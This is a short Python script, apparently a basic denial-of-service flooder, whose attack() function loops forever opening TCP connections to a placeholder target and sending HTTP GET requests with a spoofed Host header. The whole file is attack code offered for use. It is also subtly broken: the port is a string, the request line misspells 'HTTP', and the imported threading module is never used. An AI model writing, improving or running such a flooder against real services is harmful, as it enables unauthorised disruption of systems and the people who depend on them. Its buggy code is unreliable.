import socket
import threading

target = 'Provide the ip adress on which the service is operating'
fake_ip = 'Provide a fake ip address you want to use (doesnt conceal you)'
port = 'the port no of your pc you want to attack'

def attack():
    while True:
        s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
        s.connect((target , port))
        s.sendto(("GET /" + target + " HTTTP/1.1\r\n ").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()
